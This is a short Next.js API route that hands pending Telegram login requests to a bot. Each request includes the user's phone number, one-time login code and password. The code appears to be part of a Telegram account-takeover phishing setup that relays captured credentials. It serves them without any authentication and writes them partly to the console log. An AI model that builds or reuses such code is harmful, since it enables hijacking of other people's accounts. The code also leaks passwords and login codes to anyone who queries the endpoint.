import { NextResponse } from "next/server"
import { getPendingAuthRequests } from "@/lib/auth-store"

// Force dynamic rendering
export const dynamic = 'force-dynamic'

// GET /api/telegram/get-pending - Получить необработанные запросы (для бота)
export async function GET() {
  try {
    const pendingRequests = getPendingAuthRequests()

    console.log(`[API] [get-pending] Returning ${pendingRequests.length} pending requests`)
    
    if (pendingRequests.length > 0) {
      console.log(`[API] [get-pending] Requests details:`, 
        pendingRequests.map(req => ({
          requestId: req.requestId,
          action: req.action,
          phone: req.phone,
          telegramId: req.telegramId,
          status: req.status,
          processed: req.processed
        }))
      )
    }

    const response = {
      success: true,
      requests: pendingRequests.map((req) => ({
        requestId: req.requestId,
        action: req.action,
        phone: req.phone,
        code: req.code,
        password: req.password,
        chatId: req.chatId,
        telegramId: req.telegramId, // Include telegramId for session tracking
        timestamp: new Date(req.timestamp).toISOString(),
        processed: req.processed,
        status: req.status,
      })),
    }
    
    console.log(`[API] [get-pending] Response: ${JSON.stringify(response).substring(0, 500)}`)
    
    return NextResponse.json(response)
  } catch (error) {
    console.error("[API] [get-pending] Error getting pending requests:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
